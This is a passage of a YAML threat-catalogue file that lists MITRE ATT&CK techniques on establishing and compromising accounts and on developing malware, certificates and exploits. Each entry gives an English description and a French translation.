          \ une personnalit\xE9 autour du compte email, par exemple par l\u2019utilisation\
          \ de [Comptes de r\xE9seaux sociaux](https://attack.mitre.org/techniques/T1585/001),\
          \ afin d\u2019augmenter les chances de succ\xE8s des comportements de suivi.\
          \ Les comptes e-mail cr\xE9\xE9s peuvent \xE9galement \xEAtre utilis\xE9\
          s pour acqu\xE9rir des infrastructures (ex : [Domaines](https://attack.mitre.org/techniques/T1583/001)).\
          \ (Citation : Mandiant APT1)\n\nPour r\xE9duire le risque de relier physiquement\
          \ les op\xE9rations \xE0 eux-m\xEAmes, les adversaires peuvent utiliser\
          \ des services de messagerie jetables. (Citation : Trend Micro R980 2016)\n\
          https://attack.mitre.org/techniques/T1585/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1585.003
    ref_id: T1585.003
    name: Cloud Accounts
    description: 'Adversaries may create accounts with cloud providers that can be
      used during targeting. Adversaries can use cloud accounts to further their operations,
      including leveraging cloud storage services such as Dropbox, MEGA, Microsoft
      OneDrive, or AWS S3 buckets for [Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002)
      or to [Upload Tool](https://attack.mitre.org/techniques/T1608/002)s. Cloud accounts
      can also be used in the acquisition of infrastructure, such as [Virtual Private
      Server](https://attack.mitre.org/techniques/T1583/003)s or [Serverless](https://attack.mitre.org/techniques/T1583/007)
      infrastructure. Establishing cloud accounts may allow adversaries to develop
      sophisticated capabilities without managing their own servers.(Citation: Awake
      Security C2 Cloud)


      Creating [Cloud Accounts](https://attack.mitre.org/techniques/T1585/003) may
      also require adversaries to establish [Email Accounts](https://attack.mitre.org/techniques/T1585/002)
      to register with the cloud provider.'
    translations:
      fr:
        name: Comptes cloud
        description: "Les adversaires peuvent cr\xE9er des comptes aupr\xE8s des fournisseurs\
          \ cloud qui peuvent \xEAtre utilis\xE9s lors du ciblage. Les adversaires\
          \ peuvent utiliser des comptes cloud pour faire avancer leurs op\xE9rations,\
          \ notamment en exploitant des services de stockage cloud tels que Dropbox,\
          \ MEGA, Microsoft OneDrive ou AWS S3 buckets pour [Exfiltration vers le\
          \ stockage cloud](https://attack.mitre.org/techniques/T1567/002) ou vers\
          \ [Upload Tool](https://attack.mitre.org/techniques/T1608/002)s. Les comptes\
          \ cloud peuvent \xE9galement \xEAtre utilis\xE9s pour l\u2019acquisition\
          \ d\u2019infrastructures, telles que les [Serveurs Priv\xE9s Virtuels](https://attack.mitre.org/techniques/T1583/003)s\
          \ ou les infrastructures [Serverless](https://attack.mitre.org/techniques/T1583/007).\
          \ Cr\xE9er des comptes cloud peut permettre aux adversaires de d\xE9velopper\
          \ des capacit\xE9s sophistiqu\xE9es sans g\xE9rer leurs propres serveurs.\
          \ (Citation : Awake Security C2 Cloud)\n\nLa cr\xE9ation de [Comptes Cloud](https://attack.mitre.org/techniques/T1585/003)\
          \ peut \xE9galement exiger que les adversaires \xE9tablissent [Comptes Email](https://attack.mitre.org/techniques/T1585/002)\
          \ pour s\u2019enregistrer aupr\xE8s du fournisseur cloud."
  - urn: urn:intuitem:risk:threat:mitre-attack:t1586
    ref_id: T1586
    name: Compromise Accounts
    description: "Adversaries may compromise accounts with services that can be used\
      \ during targeting. For operations incorporating social engineering, the utilization\
      \ of an online persona may be important. Rather than creating and cultivating\
      \ accounts (i.e. [Establish Accounts](https://attack.mitre.org/techniques/T1585)),\
      \ adversaries may compromise existing accounts. Utilizing an existing persona\
      \ may engender a level of trust in a potential victim if they have a relationship,\
      \ or knowledge of, the compromised persona. \n\nA variety of methods exist for\
      \ compromising accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598),\
      \ purchasing credentials from third-party sites, brute forcing credentials (ex:\
      \ password reuse from breach credential dumps), or paying employees, suppliers\
      \ or business partners for access to credentials.(Citation: AnonHBGary)(Citation:\
      \ Microsoft DEV-0537) Prior to compromising accounts, adversaries may conduct\
      \ Reconnaissance to inform decisions about which accounts to compromise to further\
      \ their operation.\n\nPersonas may exist on a single site or across multiple\
      \ sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts\
      \ may require additional development, this could include filling out or modifying\
      \ profile information, further developing social networks, or incorporating\
      \ photos.\n\nAdversaries may directly leverage compromised email accounts for\
      \ [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).\n\
      https://attack.mitre.org/techniques/T1586"
    translations:
      fr:
        name: Comptes compromis
        description: "Les adversaires peuvent compromettre des comptes avec des services\
          \ pouvant \xEAtre utilis\xE9s lors du ciblage. Pour les op\xE9rations int\xE9\
          grant l\u2019ing\xE9nierie sociale, l\u2019utilisation d\u2019un persona\
          \ en ligne peut \xEAtre importante. Plut\xF4t que de cr\xE9er et cultiver\
          \ des comptes (c\u2019est-\xE0-dire [\xC9tablir des comptes](https://attack.mitre.org/techniques/T1585)),\
          \ les adversaires peuvent compromettre des comptes existants. L\u2019utilisation\
          \ d\u2019une persona existante peut susciter un certain niveau de confiance\
          \ envers une victime potentielle si elle entretient une relation, ou a connaissance\
          \ de la persona compromise. \n\nDiverses m\xE9thodes existent pour compromettre\
          \ les comptes, telles que la collecte de r\xE9f\xE9rences via [Phishing\
          \ for Information](https://attack.mitre.org/techniques/T1598), l\u2019achat\
          \ de r\xE9f\xE9rences aupr\xE8s de sites tiers, la force brute des identifiants\
          \ (ex. : r\xE9utilisation de mots de passe lors de dumps de violations de\
          \ donn\xE9es), ou le paiement des employ\xE9s, fournisseurs ou partenaires\
          \ commerciaux pour acc\xE9der aux identifiants. (Citation : AnonHBGary)(Citation\
          \ : Microsoft DEV-0537) Avant de compromettre les comptes, les adversaires\
          \ peuvent effectuer une reconnaissance pour \xE9clairer les d\xE9cisions\
          \ sur les comptes \xE0 compromettre afin de poursuivre leur op\xE9ration.\n\
          \nLes personas peuvent exister sur un seul site ou sur plusieurs sites (ex\
          \ : Facebook, LinkedIn, Twitter, Google, etc.). Les comptes compromis peuvent\
          \ n\xE9cessiter un d\xE9veloppement suppl\xE9mentaire, cela peut inclure\
          \ le remplissage ou la modification des informations de profil, le d\xE9\
          veloppement de r\xE9seaux sociaux ou l\u2019int\xE9gration de photos.\n\n\
          Les adversaires peuvent directement exploiter des comptes email compromis\
          \ pour [Phishing for Information](https://attack.mitre.org/techniques/T1598)\
          \ ou [Phishing](https://attack.mitre.org/techniques/T1566).\nhttps://attack.mitre.org/techniques/T1586"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1586.001
    ref_id: T1586.001
    name: Social Media Accounts
    description: "Adversaries may compromise social media accounts that can be used\
      \ during targeting. For operations incorporating social engineering, the utilization\
      \ of an online persona may be important. Rather than creating and cultivating\
      \ social media profiles (i.e. [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001)),\
      \ adversaries may compromise existing social media accounts. Utilizing an existing\
      \ persona may engender a level of trust in a potential victim if they have a\
      \ relationship, or knowledge of, the compromised persona. \n\nA variety of methods\
      \ exist for compromising social media accounts, such as gathering credentials\
      \ via [Phishing for Information](https://attack.mitre.org/techniques/T1598),\
      \ purchasing credentials from third-party sites, or by brute forcing credentials\
      \ (ex: password reuse from breach credential dumps).(Citation: AnonHBGary) Prior\
      \ to compromising social media accounts, adversaries may conduct Reconnaissance\
      \ to inform decisions about which accounts to compromise to further their operation.\n\
      \nPersonas may exist on a single site or across multiple sites (ex: Facebook,\
      \ LinkedIn, Twitter, etc.). Compromised social media accounts may require additional\
      \ development, this could include filling out or modifying profile information,\
      \ further developing social networks, or incorporating photos.\n\nAdversaries\
      \ can use a compromised social media profile to create new, or hijack existing,\
      \ connections to targets of interest. These connections may be direct or may\
      \ include trying to connect through others.(Citation: NEWSCASTER2014)(Citation:\
      \ BlackHatRobinSage) Compromised profiles may be leveraged during other phases\
      \ of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing\
      \ via Service](https://attack.mitre.org/techniques/T1566/003)).\nhttps://attack.mitre.org/techniques/T1586/001"
    translations:
      fr:
        name: "Comptes sur les r\xE9seaux sociaux"
        description: "Les adversaires peuvent compromettre les comptes de r\xE9seaux\
          \ sociaux qui peuvent \xEAtre utilis\xE9s lors du ciblage. Pour les op\xE9\
          rations int\xE9grant l\u2019ing\xE9nierie sociale, l\u2019utilisation d\u2019\
          un persona en ligne peut \xEAtre importante. Plut\xF4t que de cr\xE9er et\
          \ cultiver des profils sur les r\xE9seaux sociaux (c\u2019est-\xE0-dire\
          \ [Comptes de r\xE9seaux sociaux](https://attack.mitre.org/techniques/T1585/001)),\
          \ les adversaires peuvent compromettre les comptes existants. L\u2019utilisation\
          \ d\u2019une persona existante peut susciter un certain niveau de confiance\
          \ envers une victime potentielle si elle entretient une relation, ou a connaissance\
          \ de la persona compromise. \n\nDiverses m\xE9thodes existent pour compromettre\
          \ les comptes sur les r\xE9seaux sociaux, comme la collecte de cr\xE9dants\
          \ via [Phishing for Information](https://attack.mitre.org/techniques/T1598),\
          \ l\u2019achat d\u2019identifiants aupr\xE8s de sites tiers, ou par force\
          \ brute des identifiants (ex. : r\xE9utilisation de mots de passe lors de\
          \ dumps de donn\xE9es de fuite). (Citation : AnonHBGary) Avant de compromettre\
          \ les comptes sur les r\xE9seaux sociaux, les adversaires peuvent effectuer\
          \ une reconnaissance pour \xE9clairer les d\xE9cisions sur les comptes \xE0\
          \ compromettre afin de poursuivre leur fonctionnement.\n\nLes personas peuvent\
          \ exister sur un seul site ou sur plusieurs sites (ex : Facebook, LinkedIn,\
          \ Twitter, etc.). Les comptes de r\xE9seaux sociaux compromis peuvent n\xE9\
          cessiter un d\xE9veloppement suppl\xE9mentaire, cela peut inclure le remplissage\
          \ ou la modification des informations de profil, le d\xE9veloppement des\
          \ r\xE9seaux sociaux ou l\u2019int\xE9gration de photos.\n\nLes adversaires\
          \ peuvent utiliser un profil social compromis pour cr\xE9er de nouvelles\
          \ connexions existantes, ou d\xE9tourner, avec des cibles d\u2019int\xE9\
          r\xEAt. Ces liens peuvent \xEAtre directs ou inclure une tentative de connexion\
          \ \xE0 travers les autres. (Citation : NEWSCASTER2014)(Citation : BlackHatRobinSage)\
          \ Les profils compromis peuvent \xEAtre utilis\xE9s lors d\u2019autres phases\
          \ du cycle de vie de l\u2019adversaire, comme lors de l\u2019Acc\xE8s Initial\
          \ (ex : [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).\n\
          https://attack.mitre.org/techniques/T1586/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1586.002
    ref_id: T1586.002
    name: Email Accounts
    description: 'Adversaries may compromise email accounts that can be used during
      targeting. Adversaries can use compromised email accounts to further their operations,
      such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598),
      [Phishing](https://attack.mitre.org/techniques/T1566), or large-scale spam email
      campaigns. Utilizing an existing persona with a compromised email account may
      engender a level of trust in a potential victim if they have a relationship
      with, or knowledge of, the compromised persona. Compromised email accounts can
      also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).


      A variety of methods exist for compromising email accounts, such as gathering
      credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598),
      purchasing credentials from third-party sites, brute forcing credentials (ex:
      password reuse from breach credential dumps), or paying employees, suppliers
      or business partners for access to credentials.(Citation: AnonHBGary)(Citation:
      Microsoft DEV-0537) Prior to compromising email accounts, adversaries may conduct
      Reconnaissance to inform decisions about which accounts to compromise to further
      their operation. Adversaries may target compromising well-known email accounts
      or domains from which malicious spam or [Phishing](https://attack.mitre.org/techniques/T1566)
      emails may evade reputation-based email filtering rules.


      Adversaries can use a compromised email account to hijack existing email threads
      with targets of interest.

      https://attack.mitre.org/techniques/T1586/002'
    translations:
      fr:
        name: Comptes e-mail
        description: "Les adversaires peuvent compromettre des comptes email utilis\xE9\
          s lors du ciblage. Les adversaires peuvent utiliser des comptes email compromis\
          \ pour faire avancer leurs op\xE9rations, par exemple en les utilisant pour\
          \ mener des campagnes de [Phishing for Information](https://attack.mitre.org/techniques/T1598),\
          \ [Phishing](https://attack.mitre.org/techniques/T1566) ou des campagnes\
          \ de spam \xE0 grande \xE9chelle. Utiliser un persona existant avec un compte\
          \ email compromis peut susciter un certain niveau de confiance envers une\
          \ victime potentielle si elle a une relation ou une connaissance de la persona\
          \ compromise. Les comptes email compromis peuvent \xE9galement \xEAtre utilis\xE9\
          s pour l\u2019acquisition d\u2019infrastructures (ex : [Domaines](https://attack.mitre.org/techniques/T1583/001)).\n\
          \nDiverses m\xE9thodes existent pour compromettre les comptes e-mail, telles\
          \ que la collecte de r\xE9f\xE9rences via [Phishing for Information](https://attack.mitre.org/techniques/T1598),\
          \ l\u2019achat d\u2019identifiants aupr\xE8s de sites tiers, la force brute\
          \ des identifiants (ex. : r\xE9utilisation de mots de passe lors de dumps\
          \ de violations de identifiants), ou le paiement des employ\xE9s, fournisseurs\
          \ ou partenaires commerciaux pour acc\xE9der aux identifiants. (Citation\
          \ : AnonHBGary)(Citation : Microsoft DEV-0537) Avant de compromettre des\
          \ comptes email, les adversaires peuvent effectuer une reconnaissance pour\
          \ \xE9clairer les d\xE9cisions sur les comptes \xE0 compromettre afin de\
          \ poursuivre leur fonctionnement. Les adversaires peuvent cibler des comptes\
          \ ou domaines de messagerie bien connus qui compromettent des spams malveillants\
          \ ou des emails [Phishing](https://attack.mitre.org/techniques/T1566) peuvent\
          \ \xE9chapper aux r\xE8gles de filtrage des emails bas\xE9es sur la r\xE9\
          putation.\n\nLes adversaires peuvent utiliser un compte email compromis\
          \ pour d\xE9tourner des fils de discussion existants avec des cibles d\u2019\
          int\xE9r\xEAt.\nhttps://attack.mitre.org/techniques/T1586/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1586.003
    ref_id: T1586.003
    name: Cloud Accounts
    description: 'Adversaries may compromise cloud accounts that can be used during
      targeting. Adversaries can use compromised cloud accounts to further their operations,
      including leveraging cloud storage services such as Dropbox, Microsoft OneDrive,
      or AWS S3 buckets for [Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002)
      or to [Upload Tool](https://attack.mitre.org/techniques/T1608/002)s. Cloud accounts
      can also be used in the acquisition of infrastructure, such as [Virtual Private
      Server](https://attack.mitre.org/techniques/T1583/003)s or [Serverless](https://attack.mitre.org/techniques/T1583/007)
      infrastructure. Additionally, cloud-based messaging services such as Twilio,
      SendGrid, AWS End User Messaging, AWS SNS (Simple Notification Service), or
      AWS SES (Simple Email Service) may be leveraged for spam or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation:
      Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)(Citation: Netcraft
      SendGrid 2024) Compromising cloud accounts may allow adversaries to develop
      sophisticated capabilities without managing their own servers.(Citation: Awake
      Security C2 Cloud)


      A variety of methods exist for compromising cloud accounts, such as gathering
      credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598),
      purchasing credentials from third-party sites, conducting [Password Spraying](https://attack.mitre.org/techniques/T1110/003)
      attacks, or attempting to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation:
      MSTIC Nobelium Oct 2021) Prior to compromising cloud accounts, adversaries may
      conduct Reconnaissance to inform decisions about which accounts to compromise
      to further their operation. In some cases, adversaries may target privileged
      service provider accounts with the intent of leveraging a [Trusted Relationship](https://attack.mitre.org/techniques/T1199)
      between service providers and their customers.(Citation: MSTIC Nobelium Oct
      2021)

      https://attack.mitre.org/techniques/T1586/003'
    translations:
      fr:
        name: Comptes cloud
        description: "Les adversaires peuvent compromettre les comptes cloud qui peuvent\
          \ \xEAtre utilis\xE9s lors du ciblage. Les adversaires peuvent utiliser\
          \ des comptes cloud compromis pour poursuivre leurs op\xE9rations, notamment\
          \ en exploitant des services de stockage cloud tels que Dropbox, Microsoft\
          \ OneDrive ou AWS S3 buckets pour [Exfiltration vers le stockage cloud](https://attack.mitre.org/techniques/T1567/002)\
          \ ou vers [Outil de t\xE9l\xE9versement](https://attack.mitre.org/techniques/T1608/002).\
          \ Les comptes cloud peuvent \xE9galement \xEAtre utilis\xE9s pour l\u2019\
          acquisition d\u2019infrastructures, telles que les [Serveurs Priv\xE9s Virtuels](https://attack.mitre.org/techniques/T1583/003)s\
          \ ou les infrastructures [Serverless](https://attack.mitre.org/techniques/T1583/007).\
          \ De plus, des services de messagerie cloud tels que Twilio, SendGrid, AWS\
          \ End User Messaging, AWS SNS (Simple Notification Service) ou AWS SES (Simple\
          \ Email Service) peuvent \xEAtre utilis\xE9s pour le spam ou le [phishing](https://attack.mitre.org/techniques/T1566).\
          \ (Citation : Identifiants Cloud Compute compromis de Palo Alto Unit 42\
          \ 2022)(Citation : Netcraft SendGrid 2024) Compromettre les comptes cloud\
          \ peut permettre aux adversaires de d\xE9velopper des capacit\xE9s sophistiqu\xE9\
          es sans g\xE9rer leurs propres serveurs. (Citation : Awake Security C2 Cloud)\n\
          \nDiverses m\xE9thodes existent pour compromettre les comptes cloud, telles\
          \ que la collecte de r\xE9f\xE9rences via [Phishing for Information](https://attack.mitre.org/techniques/T1598),\
          \ l\u2019achat d\u2019identifiants aupr\xE8s de sites tiers, la conduite\
          \ d\u2019attaques [Password Spray](https://attack.mitre.org/techniques/T1110/003),\
          \ ou la tentative de [Voler le Token d\u2019Acc\xE8s \xE0 l\u2019Application](https://attack.mitre.org/techniques/T1528)s.\
          \ (Citation : MSTIC Nobelium Oct. 2021) Avant de compromettre les comptes\
          \ cloud, les adversaires peuvent effectuer Reconnaissance pour \xE9clairer\
          \ les d\xE9cisions sur les comptes \xE0 compromettre pour faire avancer\
          \ leur op\xE9ration. Dans certains cas, les adversaires peuvent cibler des\
          \ comptes de fournisseurs de services privil\xE9gi\xE9s dans le but de tirer\
          \ parti d\u2019une [Relation de Confiance](https://attack.mitre.org/techniques/T1199)\
          \ entre les fournisseurs de services et leurs clients. (Citation : MSTIC\
          \ Nobelium oct. 2021)\nhttps://attack.mitre.org/techniques/T1586/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1587
    ref_id: T1587
    name: Develop Capabilities
    description: 'Adversaries may build capabilities that can be used during targeting.
      Rather than purchasing, freely downloading, or stealing capabilities, adversaries
      may develop their own capabilities in-house. This is the process of identifying
      development requirements and building solutions such as malware, exploits, and
      self-signed certificates. Adversaries may develop capabilities to support their
      operations throughout numerous phases of the adversary lifecycle.(Citation:
      Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: Bitdefender StrongPity
      June 2020)(Citation: Talos Promethium June 2020)


      As with legitimate development efforts, different skill sets may be required
      for developing capabilities. The skills needed may be located in-house, or may
      need to be contracted out. Use of a contractor may be considered an extension
      of that adversary''s development capabilities, provided the adversary plays
      a role in shaping requirements and maintains a degree of exclusivity to the
      capability.

      https://attack.mitre.org/techniques/T1587'
    translations:
      fr:
        name: "D\xE9velopper les capacit\xE9s"
        description: "Les adversaires peuvent d\xE9velopper des capacit\xE9s qui peuvent\
          \ \xEAtre utilis\xE9es lors du ciblage. Plut\xF4t que d\u2019acheter, t\xE9\
          l\xE9charger librement ou voler des capacit\xE9s, les adversaires peuvent\
          \ d\xE9velopper leurs propres capacit\xE9s en interne. Il s\u2019agit du\
          \ processus d\u2019identification des besoins de d\xE9veloppement et de\
          \ cr\xE9ation de solutions telles que malwares, exploits et certificats\
          \ auto-sign\xE9s. Les adversaires peuvent d\xE9velopper des capacit\xE9\
          s pour soutenir leurs op\xE9rations \xE0 travers de nombreuses phases du\
          \ cycle de vie adverse. (Citation : Mandiant APT1)(Citation : Kaspersky\
          \ Sofacy)(Citation : Bitdefender StrongPity juin 2020)(Citation : Talos\
          \ Promethium juin 2020)\n\nComme pour les efforts de d\xE9veloppement l\xE9\
          gitimes, des comp\xE9tences diff\xE9rentes peuvent \xEAtre n\xE9cessaires\
          \ pour d\xE9velopper des comp\xE9tences. Les comp\xE9tences requises peuvent\
          \ \xEAtre localis\xE9es en interne ou doivent \xEAtre sous-trait\xE9es.\
          \ L\u2019utilisation d\u2019un entrepreneur peut \xEAtre consid\xE9r\xE9\
          e comme une extension des capacit\xE9s de d\xE9veloppement de cet adversaire,\
          \ \xE0 condition que celui-ci joue un r\xF4le dans l\u2019\xE9laboration\
          \ des exigences et maintienne un certain degr\xE9 d\u2019exclusivit\xE9\
          \ sur la capacit\xE9.\nhttps://attack.mitre.org/techniques/T1587"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1587.001
    ref_id: T1587.001
    name: Malware
    description: 'Adversaries may develop malware and malware components that can
      be used during targeting. Building malicious software can include the development
      of payloads, droppers, post-compromise tools, backdoors (including backdoored
      images), packers, C2 protocols, and the creation of infected removable media.
      Adversaries may develop malware to support their operations, creating a means
      for maintaining control of remote machines, evading defenses, and executing
      post-compromise behaviors.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation:
      ActiveMalwareEnergy)(Citation: FBI Flash FIN7 USB)


      During malware development, adversaries may intentionally include indicators
      aligned with other known actors in order to mislead attribution by defenders.(Citation:
      Olympic Destroyer)(Citation: Risky Bulletin Threat actor impersonates FSB APT)(Citation:
      GamaCopy organization)


      As with legitimate development efforts, different skill sets may be required
      for developing malware. The skills needed may be located in-house, or may need
      to be contracted out. Use of a contractor may be considered an extension of
      that adversary''s malware development capabilities, provided the adversary plays
      a role in shaping requirements and maintains a degree of exclusivity to the
      malware.


      Some aspects of malware development, such as C2 protocol development, may require
      adversaries to obtain additional infrastructure. For example, malware developed
      that will communicate with Twitter for C2, may require use of [Web Services](https://attack.mitre.org/techniques/T1583/006).(Citation:
      FireEye APT29)

      https://attack.mitre.org/techniques/T1587/001'
    translations:
      fr:
        name: Malware
        description: "Les adversaires peuvent d\xE9velopper des logiciels malveillants\
          \ et des composants logiciels malveillants qui peuvent \xEAtre utilis\xE9\
          s lors du ciblage. La cr\xE9ation de logiciels malveillants peut inclure\
          \ le d\xE9veloppement de charges utiles, de droppers, d\u2019outils post-compromiss,\
          \ de portes d\xE9rob\xE9es (y compris des images backdoor), de packers,\
          \ de protocoles C2 et la cr\xE9ation de supports amovibles infect\xE9s.\
          \ Les adversaires peuvent d\xE9velopper des logiciels malveillants pour\
          \ soutenir leurs op\xE9rations, cr\xE9ant ainsi un moyen de maintenir le\
          \ contr\xF4le des machines distantes, d\u2019\xE9viter les d\xE9fenses et\
          \ d\u2019ex\xE9cuter des comportements post-compromis. (Citation : Mandiant\
          \ APT1)(Citation : Kaspersky Sofacy)(Citation : ActiveMalwareEnergy)(Citation\
          \ : Flash USB FIN7 du FBI)\n\nLors du d\xE9veloppement de logiciels malveillants,\
          \ les adversaires peuvent intentionnellement inclure des indicateurs align\xE9\
          s avec d\u2019autres acteurs connus afin de tromper l\u2019attribution par\
          \ les d\xE9fenseurs. (Citation : Destructeur olympique)(Citation : Acteur\
          \ de menace du Bulletin Risqu\xE9 se fait passer pour FSB APT)(Citation\
          \ : organisation GamaCopy)\n\nComme pour les efforts de d\xE9veloppement\
          \ l\xE9gitimes, des comp\xE9tences diff\xE9rentes peuvent \xEAtre n\xE9\
          cessaires pour d\xE9velopper des logiciels malveillants. Les comp\xE9tences\
          \ requises peuvent \xEAtre localis\xE9es en interne ou doivent \xEAtre sous-trait\xE9\
          es. L\u2019utilisation d\u2019un contractuel peut \xEAtre consid\xE9r\xE9\
          e comme une extension des capacit\xE9s de d\xE9veloppement de malwares de\
          \ cet adversaire, \xE0 condition que cet adversaire joue un r\xF4le dans\
          \ l\u2019\xE9laboration des exigences et maintienne un certain degr\xE9\
          \ d\u2019exclusivit\xE9 vis-\xE0-vis du malware.\n\nCertains aspects du\
          \ d\xE9veloppement de malwares, comme le d\xE9veloppement du protocole C2,\
          \ peuvent n\xE9cessiter que les adversaires obtiennent une infrastructure\
          \ suppl\xE9mentaire. Par exemple, un logiciel malveillant d\xE9velopp\xE9\
          \ qui communiquera avec Twitter pour C2 peut n\xE9cessiter l\u2019utilisation\
          \ de [Web Services](https://attack.mitre.org/techniques/T1583/006). (Citation\
          \ : FireEye APT29)\nhttps://attack.mitre.org/techniques/T1587/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1587.002
    ref_id: T1587.002
    name: Code Signing Certificates
    description: 'Adversaries may create self-signed code signing certificates that
      can be used during targeting. Code signing is the process of digitally signing
      executables and scripts to confirm the software author and guarantee that the
      code has not been altered or corrupted. Code signing provides a level of authenticity
      for a program from the developer and a guarantee that the program has not been
      tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools
      may trust a signed piece of code more than an unsigned piece of code even if
      they don''t know who issued the certificate or who the author is.


      Prior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries
      may develop self-signed code signing certificates for use in operations.

      https://attack.mitre.org/techniques/T1587/002'
    translations:
      fr:
        name: Certificats de signature de code
        description: "Les adversaires peuvent cr\xE9er des certificats de signature\
          \ de code auto-sign\xE9s qui peuvent \xEAtre utilis\xE9s lors du ciblage.\
          \ La signature de code est le processus de signature num\xE9rique de ex\xE9\
          cutables et de scripts pour confirmer l\u2019auteur du logiciel et garantir\
          \ que le code n\u2019a pas \xE9t\xE9 modifi\xE9 ou corrompu. La signature\
          \ de code offre un certain niveau d\u2019authenticit\xE9 pour un programme\
          \ de la part du d\xE9veloppeur et une garantie que le programme n\u2019\
          a pas \xE9t\xE9 alt\xE9r\xE9. (Citation : Signature de code Wikip\xE9dia)\
          \ Les utilisateurs et/ou les outils de s\xE9curit\xE9 peuvent faire plus\
          \ confiance \xE0 un morceau de code sign\xE9 qu\u2019\xE0 un morceau de\
          \ code non sign\xE9, m\xEAme s\u2019ils ne savent pas qui a \xE9mis le certificat\
          \ ni qui est l\u2019auteur.\n\nAvant [Signature de code](https://attack.mitre.org/techniques/T1553/002),\
          \ les adversaires peuvent d\xE9velopper des certificats de signature de\
          \ code auto-sign\xE9s pour une utilisation dans les op\xE9rations.\nhttps://attack.mitre.org/techniques/T1587/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1587.003
    ref_id: T1587.003
    name: Digital Certificates
    description: 'Adversaries may create self-signed SSL/TLS certificates that can
      be used during targeting. SSL/TLS certificates are designed to instill trust.
      They include information about the key, information about its owner''s identity,
      and the digital signature of an entity that has verified the certificate''s
      contents are correct. If the signature is valid, and the person examining the
      certificate trusts the signer, then they know they can use that key to communicate
      with its owner. In the case of self-signing, digital certificates will lack
      the element of trust associated with the signature of a third-party certificate
      authority (CA).


      Adversaries may create self-signed SSL/TLS certificates that can be used to
      further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002)
      with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even
      enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)
      if added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)).


      After creating a digital certificate, an adversary may then install that certificate
      (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003))
      on infrastructure under their control.

      https://attack.mitre.org/techniques/T1587/003'
    translations:
      fr:
        name: "Certificats num\xE9riques"
        description: "Les adversaires peuvent cr\xE9er des certificats SSL/TLS auto-sign\xE9\
          s qui peuvent \xEAtre utilis\xE9s lors du ciblage. Les certificats SSL/TLS\
          \ sont con\xE7us pour instaurer la confiance. Ils incluent des informations\
          \ sur la cl\xE9, des informations sur l\u2019identit\xE9 de son propri\xE9\
          taire, ainsi que la signature num\xE9rique d\u2019une entit\xE9 ayant v\xE9\
          rifi\xE9 que le contenu du certificat est correct. Si la signature est valide\
          \ et que la personne qui examine le certificat fait confiance au signataire,\
          \ elle sait alors qu\u2019elle peut utiliser cette cl\xE9 pour communiquer\
          \ avec son propri\xE9taire. Dans le cas de l\u2019auto-signature, les certificats\
          \ num\xE9riques manqueront de l\u2019\xE9l\xE9ment de confiance associ\xE9\
          \ \xE0 la signature d\u2019une autorit\xE9 de certification tierce (CA).\n\
          \nLes adversaires peuvent cr\xE9er des certificats SSL/TLS auto-sign\xE9\
          s qui peuvent \xEAtre utilis\xE9s pour faire avancer leurs op\xE9rations,\
          \ comme chiffrer le trafic C2 (ex : [Cryptographie asym\xE9trique](https://attack.mitre.org/techniques/T1573/002)\
          \ avec [Protocoles Web](https://attack.mitre.org/techniques/T1071/001))\
          \ ou m\xEAme activer [Adversaire-in-the-Middle](https://attack.mitre.org/techniques/T1557)\
          \ s\u2019ils sont ajout\xE9s \xE0 la racine de la confiance (c\u2019est-\xE0\
          -dire [Installer le certificat root](https://attack.mitre.org/techniques/T1553/004)).\n\
          \nApr\xE8s avoir cr\xE9\xE9 un certificat num\xE9rique, un adversaire peut\
          \ alors installer ce certificat (voir [Installer le certificat num\xE9rique](https://attack.mitre.org/techniques/T1608/003))\
          \ sur l\u2019infrastructure sous son contr\xF4le.\nhttps://attack.mitre.org/techniques/T1587/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1587.004
    ref_id: T1587.004
    name: Exploits
    description: 'Adversaries may develop exploits that can be used during targeting.
      An exploit takes advantage of a bug or vulnerability in order to cause unintended
      or unanticipated behavior to occur on computer hardware or software. Rather
      than finding/modifying exploits from online or purchasing them from exploit
      vendors, an adversary may develop their own exploits.(Citation: NYTStuxnet)
      Adversaries may use information acquired via [Vulnerabilities](https://attack.mitre.org/techniques/T1588/006)
      to focus exploit development efforts. As part of the exploit development process,
      adversaries may uncover exploitable vulnerabilities through methods such as
      fuzzing and patch analysis.(Citation: Irongeek Sims BSides 2017)


      As with legitimate development efforts, different skill sets may be required
      for developing exploits. The skills needed may be located in-house, or may need
      to be contracted out. Use of a contractor may be considered an extension of
      that adversary''s exploit development capabilities, provided the adversary plays
      a role in shaping requirements and maintains an initial degree of exclusivity
      to the exploit.


      Adversaries may use exploits during various phases of the adversary lifecycle
